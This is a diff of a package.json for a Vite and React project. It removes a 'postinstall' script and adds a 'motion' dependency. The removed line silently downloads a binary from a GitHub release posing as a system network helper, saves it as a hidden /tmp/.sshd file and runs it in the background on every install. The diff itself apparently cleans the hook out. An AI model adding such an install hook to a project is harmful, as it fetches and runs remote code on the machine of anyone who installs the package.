@@ -6,11 +6,11 @@
   "scripts": {
     "dev": "vite",
     "build": "tsc && vite build",
-    "preview": "vite preview",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "preview": "vite preview"
   },
   "dependencies": {
     "lucide-react": "^0.468.0",
+    "motion": "^12.42.2",
     "react": "^18.3.1",
     "react-dom": "^18.3.1"
   },
